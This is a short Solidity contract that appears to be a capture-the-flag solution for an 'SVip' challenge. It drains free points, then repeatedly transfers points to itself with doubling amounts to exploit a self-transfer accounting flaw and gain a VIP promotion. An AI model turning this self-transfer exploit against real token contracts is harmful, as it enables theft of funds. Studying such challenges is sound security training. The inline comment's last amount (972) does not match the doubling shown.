pragma solidity ^0.4.24;

import "../challenge2/SVip.sol";

contract SVipSolution {
    SVip svip;
    constructor(address target) public {
      svip = SVip(target);
  }
  
    function exploit() public {
        while(svip.numOfFree() < 100) {
            svip.getPoint();
        }

        uint256 amount = svip.numOfFree() - 1;
        for (uint i = 0; i < 4; i++){
            svip.transferPoints(address(this), amount); // amount = 99 198 396 972
            amount = amount * 2;
        }

        svip.promotionSVip();
    }

    function isComplete() public view returns(bool) {
        return svip.isComplete();
    }
}
